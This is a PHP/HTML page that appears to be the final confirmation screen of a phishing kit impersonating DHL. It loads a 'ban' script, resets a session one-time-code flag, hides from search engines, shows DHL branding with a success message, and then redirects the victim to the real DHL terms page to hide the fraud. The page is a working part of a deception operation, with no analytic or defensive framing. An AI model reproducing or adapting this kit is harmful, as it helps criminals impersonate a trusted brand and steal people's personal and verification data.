<?php
   session_start();
   include("./c/ban.php");
   include("./c/sys.php");
   include("lang.php");
   $_SESSION['otp'] = 0;
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
      <meta http-equiv="refresh" content="10; url=https://www.dhl.com/us-en/home/footer/terms-of-use.html" />
      <style type="text/css">
         :root {
            --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
            --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
            --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
            --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
            --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
            --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
            --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
         }
         :root {
            --bs-blue: #0d6efd;
            --bs-indigo: #6610f2;
            --bs-purple: #6f42c1;
            --bs-pink: #d63384;
            --bs-red: #dc3545;
            --bs-orange: #fd7e14;
            --bs-yellow: #ffc107;
            --bs-green: #198754;
            --bs-teal: #20c997;
            --bs-cyan: #0dcaf0;
            --bs-white: #fff;
            --bs-gray: #6c757d;
            --bs-gray-dark: #343a40;
            --bs-primary: #0d6efd;
            --bs-secondary: #6c757d;
            --bs-success: #198754;
            --bs-info: #0dcaf0;
            --bs-warning: #ffc107;
            --bs-danger: #dc3545;
            --bs-light: #f8f9fa;
            --bs-dark: #212529;
            --bs-font-sans-serif: c-ui, -apple-c, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
         }
         *,
         ::after,
         ::before {
            box-sizing: border-box;
         }
         @media (prefers-reduced-motion:no-preference) {
            :root {
               scroll-behavior: smooth;
            }
         }
         body {
            margin: 0;
            font-family: var(--bs-font-sans-serif);
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #212529;
            background-color: #fff;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
         }
         h4 {
            margin-top: 0;
            margin-bottom: .5rem;
            font-weight: 500;
            line-height: 1.2;
         }
         h4 {
            font-size: calc(1.275rem + .3vw);
         }
         @media (min-width:1200px) {
            h4 {
               font-size: 1.5rem;
            }
         }
         p {
            margin-top: 0;
            margin-bottom: 1rem;
         }
         img {
            vertical-align: middle;
         }
         .modal-dialog {
            position: relative;
            width: auto;
            margin: .5rem;
            pointer-events: none;
         }
         .modal-content {
            position: relative;
            display: flex;
            flex-direction: column;
            width: 100%;
            pointer-events: auto;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid rgba(0, 0, 0, .2);
            border-radius: .3rem;
            outline: 0;
         }
         .modal-header {
            display: flex;
            flex-shrink: 0;
            align-items: center;
            justify-content: space-between;
            padding: 1rem 1rem;
            border-bottom: 1px solid #dee2e6;
            border-top-left-radius: calc(.3rem - 1px);
            border-top-right-radius: calc(.3rem - 1px);
         }
         .modal-body {
            position: relative;
            flex: 1 1 auto;
            padding: 1rem;
         }
         @media (min-width:576px) {
            .modal-dialog {
               max-width: 500px;
               margin: 1.75rem auto;
            }
         }
         .shadow {
            box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15) !important;
         }
         .px-3 {
            padding-right: 1rem !important;
            padding-left: 1rem !important;
         }
         .py-3 {
            padding-top: 1rem !important;
            padding-bottom: 1rem !important;
         }
         .pt-3 {
            padding-top: 1rem !important;
         }
         .text-center {
            text-align: center !important;
         }
         body {
            margin: 0;
            padding: 0;
         }
         .modal-content .modal-header {
            background: linear-gradient(to right, #FFCC00, #FFCC00, #FFEFB1);
         }
         .modal-content .modal-header img {
            width: 100px;
         }
         .modal-content .modal-body {
            padding: 0;
         }
         .modal-content .modal-body .copirayt {
            background: linear-gradient(to right, #FFCC00, #FFCC00, #FFEFB1);
            padding: 10px;
         }
         .modal-content .modal-body .copirayt p {
            font-size: 13px;
            color: black;
            font-weight: 600;
            margin-bottom: 0;
         }
      </style>
      <link rel="icon" type="image/x-icon" href="./f/favicon.ico" />
      <title>| DHL |</title>
   </head>
   <body>
      <div>
         <div class="modal-dialog shadow">
            <div class="modal-content" style="margin-top: 50px;">
               <div class="modal-header">
                  <img src="./f/dhl-logo.svg">
               </div>
               <br>
               <br>
               <div class="modal-body pt-3">
                  <div class="text-center"><img src="./f/valid.gif" width="100"></div>
                  <br>
                  <div class="text-center px-3 py-3">
                     <h4 style="color:green;"><?php echo get_text("thanks_2"); ?></h4>
                     <p>
                        <?php echo get_text("thanks"); ?>
                     </p>
                     <br>
                  </div>
                  <div class="copirayt text-center">
                     <p><?php echo get_text("copyright"); ?></p>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>